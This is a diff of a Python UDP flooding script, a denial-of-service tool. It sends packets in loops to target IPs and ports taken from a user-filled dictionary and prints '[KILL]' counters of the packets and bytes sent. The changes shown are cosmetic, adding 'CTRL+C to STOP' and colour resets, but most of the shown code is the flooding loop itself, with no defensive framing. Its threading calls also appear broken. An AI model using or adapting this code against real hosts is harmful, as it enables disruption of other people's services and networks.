@@ -5,7 +5,8 @@ import datetime
 import json
 from colorama import Fore, Back, Style
 ips = {
-    "Your collection of": "IPs"
+
+    "Your collection of ": "IPs"
 }
 
 f = ips.values()
@@ -210,8 +211,9 @@ if chooose == '1':
             client.sendto(packet, (ip, porti))
             x += byi
             sent += 1
-            txt = Fore.RED + """ /![KILL]!\ Sended """+ Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED +""" to """ + Fore.MAGENTA +"""{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ """
+            txt = Fore.RED + """ /![KILL]!\ Sended """ + Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED + """ to """ + Fore.MAGENTA + """{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ CTRL+C to STOP"""
             print(txt.format(sent, x, ip, porti))
+            print(Fore.RESET)
 for i in range(thi):
     threading.Thread(target=dos)
     dos(bytearray(byi))
@@ -225,8 +227,9 @@ if chooose == '2':
             client1.sendto(packet, (ip, porti))
             x += byi
             sent += 1
-            txt1 = Fore.RED + """ /![KILL]!\ Sended """ + Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED + """ to """ + Fore.MAGENTA + """{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ """
+            txt1 = Fore.RED + """ /![KILL]!\ Sended """ + Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED + """ to """ + Fore.MAGENTA + """{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ CTRL+C to STOP"""
             print(txt1.format(sent, x, ip, porti))
+            print(Fore.RESET)
 for i in range(thi):
     threading.Thread(target=dos2)
     dos2(bytearray(byi))
@@ -242,8 +245,9 @@ if chooose == '3':
             client2.sendto(packet, (ip, porti))
             x += byi
             sent += 1
-            txt2 = Fore.RED + """ /![KILL]!\ Sended """ + Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED + """ to """ + Fore.MAGENTA + """{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ """
+            txt2 = Fore.RED + """ /![KILL]!\ Sended """ + Fore.BLUE + """{}""" + Fore.RED + """ packets, bytes sended """ + Fore.CYAN + """{}""" + Fore.RED + """ to """ + Fore.MAGENTA + """{}""" + Fore.RED + """ : """ + Fore.MAGENTA + """{}""" + Fore.RED + """ /![KILL]!\ CTRL+C to STOP"""
             print(txt2.format(sent, x, ip, porti))
+            print(Fore.RESET)
 for i in range(thi):
     threading.Thread(target=dos3)
     dos3(bytearray(byi))
